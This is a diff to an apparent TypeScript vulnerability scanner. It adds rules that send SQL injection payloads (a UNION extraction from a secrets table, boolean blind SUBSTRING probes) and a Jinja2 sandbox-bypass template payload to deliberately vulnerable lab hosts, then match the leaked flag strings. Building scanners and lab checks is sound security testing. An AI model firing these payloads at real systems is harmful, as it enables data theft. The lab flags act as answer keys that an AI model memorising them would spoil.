@@ -37518,6 +37518,135 @@ const sstiVulnlabFilteredRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const SQLI_VULNLAB_UNION_PAYLOAD = "widgets' UNION SELECT name, value, 0 FROM secrets-- ";
+const SQLI_VULNLAB_UNION_SECRET = "VULNLAB{sqli-union-based-extraction}";
+
+const sqliVulnlabUnionLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sqliVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/union/", origin);
+  probeUrl.searchParams.set("category", SQLI_VULNLAB_UNION_PAYLOAD);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = doc.body;
+  const hasUnionQuery =
+    /SELECT name, description, price FROM products WHERE category=/i.test(body) &&
+    /UNION SELECT name, value, 0 FROM secrets/i.test(body);
+  if (!hasUnionQuery || !body.includes(SQLI_VULNLAB_UNION_SECRET)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      payload: `category=${SQLI_VULNLAB_UNION_PAYLOAD}`,
+      secret: SQLI_VULNLAB_UNION_SECRET,
+      snippet: body.match(/VULNLAB\{sqli-union[^}]+\}/)?.[0] || "",
+      note: "sqli.vulnlab.dev GET /union/?category=widgets' UNION SELECT name, value, 0 FROM secrets-- leaks VULNLAB{sqli-union-based-extraction} in rendered rows — in-band UNION SQLi oracle"
+    }
+  };
+};
+
+const sqliVulnlabUnionRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/union\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sqliVulnlabUnionLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const SQLI_VULNLAB_BLIND_BOOL_TRUE =
+  "1 AND SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-bool'),1,1)='V'";
+const SQLI_VULNLAB_BLIND_BOOL_FALSE =
+  "1 AND SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-bool'),1,1)='Z'";
+
+async function sqliVulnlabBlindBoolProductFound(
+  ctx: RuleContext,
+  origin: string,
+  idPayload: string
+): Promise<boolean> {
+  const probeUrl = new URL("/blind-bool/", origin);
+  probeUrl.searchParams.set("id", idPayload);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return false;
+  return /<h2>\s*Widget Pro\s*<\/h2>/i.test(doc.body);
+}
+
+const sqliVulnlabBlindBoolLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sqliVulnlabProbeOrigin(ctx);
+  const baselineFound = await sqliVulnlabBlindBoolProductFound(ctx, origin, "1");
+  if (!baselineFound) return NEGATIVE;
+  const trueFound = await sqliVulnlabBlindBoolProductFound(ctx, origin, SQLI_VULNLAB_BLIND_BOOL_TRUE);
+  const falseFound = await sqliVulnlabBlindBoolProductFound(ctx, origin, SQLI_VULNLAB_BLIND_BOOL_FALSE);
+  if (!trueFound || falseFound) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: new URL("/blind-bool/", origin).toString(),
+      truePayload: SQLI_VULNLAB_BLIND_BOOL_TRUE,
+      falsePayload: SQLI_VULNLAB_BLIND_BOOL_FALSE,
+      note: "sqli.vulnlab.dev GET /blind-bool/?id= returns Widget Pro for true SUBSTRING(secret,1,1)='V' but Not found for 'Z' — boolean blind SQLi oracle"
+    }
+  };
+};
+
+const sqliVulnlabBlindBoolRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blind-bool\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sqliVulnlabBlindBoolLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const SSTI_VULNLAB_SANDBOXED_PAYLOAD = "{{ dump_diagnostics() }}";
+const SSTI_VULNLAB_SANDBOXED_SECRET = "VULNLAB{ssti-jinja2-sandbox-bypassed-via-helper}";
+
+const sstiVulnlabSandboxedLiveOracle: Rule = async (ctx) => {
+  if (!isSstiVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sstiVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/sandboxed/", origin);
+  probeUrl.searchParams.set("greeting", SSTI_VULNLAB_SANDBOXED_PAYLOAD);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 32768, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const rendered = sstiVulnlabRenderedBody(doc.body);
+  if (!rendered || !rendered.includes(SSTI_VULNLAB_SANDBOXED_SECRET)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      payload: `greeting=${SSTI_VULNLAB_SANDBOXED_PAYLOAD}`,
+      secret: SSTI_VULNLAB_SANDBOXED_SECRET,
+      snippet: rendered.match(/VULNLAB_SSTI_SANDBOXED[^}]+VULNLAB\{[^}]+\}/)?.[0]?.slice(0, 160) || "",
+      note: "ssti.vulnlab.dev GET /sandboxed/?greeting={{ dump_diagnostics() }} leaks VULNLAB{ssti-jinja2-sandbox-bypassed-via-helper} from SandboxedEnvironment global — sandbox bypass SSTI oracle"
+    }
+  };
+};
+
+const sstiVulnlabSandboxedRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSstiVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/sandboxed\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sstiVulnlabSandboxedLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
 const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
@@ -47285,6 +47414,12 @@ export const RULES: Record<string, Rule> = {
   sstiVulnlabSecondOrderRouteLiveOracle,
   sstiVulnlabFilteredLiveOracle,
   sstiVulnlabFilteredRouteLiveOracle,
+  sqliVulnlabUnionLiveOracle,
+  sqliVulnlabUnionRouteLiveOracle,
+  sqliVulnlabBlindBoolLiveOracle,
+  sqliVulnlabBlindBoolRouteLiveOracle,
+  sstiVulnlabSandboxedLiveOracle,
+  sstiVulnlabSandboxedRouteLiveOracle,
   juiceShopJwtAlgNoneLiveOracle,
   juiceShopChatbotApiLiveOracle,
   juiceShopChatbotRouteLiveOracle,
